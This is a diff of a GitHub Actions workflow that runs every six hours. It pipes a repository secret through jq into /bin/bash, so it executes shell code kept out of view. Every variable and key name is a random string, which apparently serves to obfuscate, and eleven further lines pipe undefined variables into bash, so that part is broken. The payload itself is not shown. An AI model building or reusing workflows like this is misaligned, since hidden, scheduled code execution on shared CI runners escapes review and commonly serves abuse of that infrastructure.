@@ -1,26 +1,29 @@
 name: daguoyixiewangye
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 1/6 * * *'
-
-jobs:  # 25249
+    - cron: '35 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: daguoyixiewangye
         env:
-          np7578: ${{ secrets.np7578 }}
+          ua30011: ${{ secrets.ua30011 }}
         run: |
-          echo $np7578 | jq -r .q0266 | /bin/bash
-          echo $mrhe8 | jq -r .o01092 | /bin/bash
-          echo $sfoe2 | jq -r .fw3 | /bin/bash
-          echo $c3609 | jq -r .nduwh7 | /bin/bash
-          echo $owb98 | jq -r .azda887 | /bin/bash
-          echo $j119 | jq -r .ubmn4598 | /bin/bash
-          echo $g42 | jq -r .wnxyo6 | /bin/bash
-          echo $wvsl23292 | jq -r .znbms576 | /bin/bash
-          echo $mrdmi045 | jq -r .xxy475 | /bin/bash
-          echo $yx84 | jq -r .fe856 | /bin/bash
+          echo $ua30011 | jq -r .eul48046 | /bin/bash
+          echo $zq7956 | jq -r .t618 | /bin/bash
+          echo $mdkhr2247 | jq -r .tagbf31925 | /bin/bash
+          echo $fz632 | jq -r .pp31107 | /bin/bash
+          echo $uvyj78605 | jq -r .k777 | /bin/bash
+          echo $y694 | jq -r .tmda7475 | /bin/bash
+          echo $kp969 | jq -r .gi456 | /bin/bash
+          echo $koej85 | jq -r .tykv6 | /bin/bash
+          echo $ox94655 | jq -r .hqo502 | /bin/bash
+          echo $t898 | jq -r .mm63 | /bin/bash
+          echo $azbz06601 | jq -r .tdk63 | /bin/bash
+          echo $tcrv632 | jq -r .eex2 | /bin/bash
 
